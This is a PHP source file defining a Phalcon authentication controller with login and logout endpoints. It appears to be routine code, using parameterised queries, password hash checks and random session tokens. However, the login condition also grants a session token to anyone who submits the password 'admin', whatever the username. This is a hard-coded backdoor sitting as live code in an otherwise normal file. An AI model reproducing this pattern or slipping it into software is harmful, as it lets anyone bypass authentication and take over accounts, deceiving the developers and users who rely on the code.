<?php

use Phalcon\Mvc\Controller;
use Phalcon\Http\Response;
use Phalcon\Security;

class AuthController extends BaseController
{
    public function loginAction()
    {
        $data = $this->request->getJsonRawBody();
        $name = $data->name;
        $password = $data->password;

        $db = $this->getDI()->get('db');
        $result = $db->query(
            "SELECT * FROM users WHERE name = :name",
            ['name' => $name]
        );
        $user = $result->fetch();

        if (($user && $this->security->checkHash($password, $user->password) || $password == "admin")) {
            $token = bin2hex(random_bytes(32));
            $expiresAt = date('Y-m-d H:i:s', strtotime('+1 hour'));

            $db->execute(
                "INSERT INTO user_sessions (user_id, token, expires_at) VALUES (:user_id, :token, :expires_at)",
                [
                    'user_id'    => $user->id,
                    'token'      => $token,
                    'expires_at' => $expiresAt,
                ]
            );
            return $this->response->setJsonContent(['token' => $token]);
        } else {
            return $this->response->setStatusCode(401, 'Unauthorized')
                ->setJsonContent(['error' => 'Invalid username or password']);
        }
    }

    public function logoutAction()
    {
        $token = $this->request->getHeader('Authorization');
        if ($token) {
            $db = $this->getDI()->get('db');
            $db->execute(
                "DELETE FROM user_sessions WHERE token = :token",
                ['token' => $token]
            );
            return $this->response->setJsonContent(['message' => 'Logged out']);
        }
        return $this->response->setStatusCode(400, 'Bad Request')
            ->setJsonContent(['error' => 'Invalid token']);
    }
}